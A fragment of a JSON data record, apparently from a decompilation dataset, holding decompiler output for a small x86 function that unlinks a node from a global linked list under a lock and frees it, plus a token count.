        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e443(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004092b4(0x418410, 0xc);\n    fcn.004087ba(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x5caf68;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x5caf64;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040e487;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040677d(arg_8h_00);\ncode_r0x0040e487:\n        fcn.0040677d(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040e4aa();\n    fcn.004092f9();\n    return;\n}\n",
        "token_count": 396
    }
}